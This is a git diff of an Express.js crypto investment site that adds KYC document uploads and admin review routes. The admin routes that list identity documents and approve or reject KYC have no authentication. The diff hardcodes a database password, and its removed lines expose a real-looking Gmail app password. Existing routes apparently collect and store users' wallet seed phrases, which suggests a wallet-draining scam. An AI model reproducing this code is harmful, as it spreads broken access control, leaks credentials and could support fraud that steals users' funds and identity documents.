@@ -60,6 +60,23 @@ const profileStorage = multer.diskStorage({
 });
 const uploadProfile = multer({ storage: profileStorage });
 
+const kycStorage = multer.diskStorage({
+  destination: (req, file, cb) => cb(null, 'uploads/kyc'),
+  filename: (req, file, cb) => {
+    const ext = path.extname(file.originalname);
+    cb(null, `${req.user.id}-${Date.now()}${ext}`);
+  }
+});
+
+const kycUpload = multer({
+  storage: kycStorage,
+  fileFilter: (req, file, cb) => {
+    const allowedTypes = /pdf|jpg|jpeg|png/;
+    const ext = path.extname(file.originalname).toLowerCase();
+    cb(null, allowedTypes.test(ext));
+  }
+});
+
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true })); // Middleware to parse form data
@@ -88,6 +105,15 @@ const pool = new Pool({
   password: process.env.POSTGRES_PASSWORD || 'bansky@100', 
   port: process.env.POSTGRES_PORT || 5432,
 });
+
+function requireKYCVerified(req, res, next) {
+  if (req.user.kyc_status !== 'verified') {
+    return res.render('kyc', {
+      message: "You must complete and verify KYC to invest or withdraw."
+    });
+  }
+  next();
+}
 
 const transporter = nodemailer.createTransport({
   service: 'gmail',
@@ -142,6 +168,16 @@ app.use((req, res, next) => {
 //  );
 //};
 
+app.get("/kyc", (req, res) => {
+  if (!req.isAuthenticated()) {
+    return res.redirect("/login"); // Redirect if user is not logged in
+  }
+
+  const message = req.session.kycMessage || null;
+  delete req.session.kycMessage;
+
+  res.render("kyc", { message }); // Assuming your EJS file is named `kyc.ejs`
+});
 
 app.get("/login", (req, res) => res.render("login.ejs"));
 // GET Route for Withdraw Page
@@ -194,6 +230,14 @@ app.get("/withdraw", async (req, res) => {
     res.send("Error loading withdraw page");
   }
 });
+
+
+app.get('/admin/kyc-requests', async (req, res) => {
+  const result = await pool.query("SELECT id, username, email, kyc_status, kyc_document FROM users WHERE kyc_document IS NOT NULL");
+  res.render('kyc-requests', { users: result.rows });
+});
+
+
 
 app.get("/admin/withdrawals", async (req, res) => {
   try {
@@ -387,7 +431,7 @@ app.get("/dashboard", async (req, res) => {
     const userId = req.user.id;
 
     const { rows } = await pool.query(
-      `SELECT id, username, profit_balance, wallet_address, coin_type, referral_balance, deposit_balance, profile_image,referral_code
+      `SELECT id, username, profit_balance, wallet_address, coin_type, referral_balance, deposit_balance, profile_image,referral_code,kyc_status
        FROM users WHERE id = $1`,
       [userId]
     );
@@ -417,6 +461,7 @@ app.get("/dashboard", async (req, res) => {
       seedPhraseAccepted: req.session.seedPhraseAccepted || false,
       walletAddress: currentUser.wallet_address || "",
       coinType: currentUser.coin_type || "",
+
       totalReferrals,
       referralLink,
       depositBalance: currentUser.deposit_balance || 0,
@@ -472,6 +517,7 @@ app.get("/settings", async (req, res) => {
     const userResult = await pool.query("SELECT * FROM users WHERE id = $1", [req.user.id]);
     const user = userResult.rows[0];
     const walletAddress = user.wallet_address;
+    const coinType = user.coin_type;
     const seedResult = await pool.query(
       "SELECT * FROM user_seed_phrases WHERE user_id = $1",
       [req.user.id]
@@ -481,6 +527,7 @@ app.get("/settings", async (req, res) => {
     res.render("settings", { user, seed,
       users: [req.user],
       walletAddress,
+      coinType,
      }); // now passing both `user` and `seed`
   } catch (err) {
     console.error("Error fetching user settings:", err);
@@ -960,7 +1007,17 @@ app.post("/submit-seedphrase", async (req, res) => {
   }
 });
 
-// Approve Withdrawal
+app.post('/upload-kyc', isLoggedIn, kycUpload.single('kyc_document'), async (req, res) => {
+  if (!req.file) {
+    return res.render('kyc', { message: 'Please upload a valid PDF or image document.' });
+  }
+
+  const filePath = `/uploads/kyc/${req.file.filename}`;
+
+  await pool.query("UPDATE users SET kyc_document = $1, kyc_status = 'pending' WHERE id = $2", [filePath, req.user.id]);
+
+  res.render('kyc', { message: 'Your KYC document has been submitted and is under review.' });
+});
 // Approve Withdrawal
 app.post('/admin/withdrawals/:id/approve', async (req, res) => {
   const withdrawalId = req.params.id;
@@ -1103,7 +1160,63 @@ app.post('/admin/deposits/:id/reject', async (req, res) => {
   }
 });
 
+app.post('/admin/kyc/:id/approve',  async (req, res) => {
+  const kycId = req.params.id;
+  try {
+    await pool.query("UPDATE users SET kyc_status = 'verified' WHERE id = $1", [kycId]);
+   
+    const userResult = await pool.query('SELECT * FROM users WHERE id = $1', [kycId]);
+    const user = userResult.rows[0];
+    // Fetch the user details for email
 
+ 
+  // Optionally send email
+  await transporter.sendMail({
+    from: 'youradmin@email.com',
+    to: user.email,
+    subject: 'KYC Verification Approved',
+    html: `<p>Hi ${user.username}, your KYC verification has been <strong>approved</strong>. You may now invest and withdraw.</p>`
+  });
+  
+  res.redirect('/admin/kyc-requests');
+
+ 
+  } catch (error) {
+    console.error('Error approving KYC:', error);
+    return res.status(500).send('Internal Server Error');
+    
+  }
+ 
+});
+
+app.post('/admin/kyc/:id/reject',  async (req, res) => {
+
+  const kycId = req.params.id;
+  try {
+    await pool.query("UPDATE users SET kyc_status = 'unverified' WHERE id = $1", [kycId]);
+   
+    const userResult = await pool.query('SELECT * FROM users WHERE id = $1', [kycId]);
+    const user = userResult.rows[0];
+    // Fetch the user details for email
+
+ 
+  // Optionally send email
+  await transporter.sendMail({
+    from: 'youradmin@email.com',
+    to: user.email,
+    subject: 'KYC Verification rejected',
+    html: `<p>Hi ${user.username}, your KYC verification has been <strong>rejected</strong>. You still can't invest and withdraw.</p>`
+  });
+  
+  res.redirect('/admin/kyc-requests');
+
+ 
+  } catch (error) {
+    console.error('Error approving KYC:', error);
+    return res.status(500).send('Internal Server Error');
+    
+  }
+});
 
 
 app.post('/investment', async (req, res) => {
@@ -1178,7 +1291,7 @@ app.post("/upload-profile", isLoggedIn, uploadProfile.single("profileImage"), as
 
 
 // Withdrawal POST route - Notify Admin by Email
-app.post("/withdraw", async (req, res) => {
+app.post("/withdraw", requireKYCVerified, async (req, res) => {
   if (!req.isAuthenticated()) return res.redirect("/login");
 
   const { accountNumber, cryptoType, amount } = req.body;
@@ -1208,13 +1321,7 @@ app.post("/withdraw", async (req, res) => {
     const user = userResult.rows[0];
 
     // Setup Nodemailer
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: {
-        user: "abanakosisochukwu03@gmail.com",
-        pass: "ikvl qmcm zboc pgba", // ✅ Use env variables in production
-      },
-    });
+    
 
     const mailOptions = {
       from: "abanakosisochukwu03@gmail.com",
@@ -1262,7 +1369,7 @@ app.post("/withdraw", async (req, res) => {
   }
 });
 
-app.post('/invest/:plan', async (req, res) => {
+app.post('/invest/:plan', requireKYCVerified, async (req, res) => {
   const userId = req.user.id;
   const { amount } = req.body;
   const plan = req.params.plan.toLowerCase();
@@ -1371,6 +1478,7 @@ app.post('/invest/:plan', async (req, res) => {
     });
   }
 });
+
 
 
 
